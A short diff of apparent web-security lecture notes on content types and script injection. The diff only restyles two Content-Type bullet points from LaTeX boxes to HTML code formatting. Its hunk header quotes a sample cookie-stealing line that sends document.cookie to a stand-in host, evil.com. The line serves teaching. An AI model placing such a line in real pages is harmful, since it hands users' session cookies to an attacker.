@@ -27,8 +27,8 @@ image.src = "https://evil.com/?cookie=" + document.cookie;
 
 * HTTP response headers include a <em>Content-Type</em> 
 
-   * \\fbox{<code></code> Content-Type: text/html} --- is HTML
-   * \\fbox{<code></code> Content-Type: image/png} --- is PNG-format image
+   * <code style="border: 2px solid black">Content-Type: text/html</code> --- is HTML
+   * <code style="border: 2px solid black">Content-Type: image/png</code> --- is PNG-format image
    * …
 
 * <em><em>should</em> prevent this problem</em> --- if server sends it 
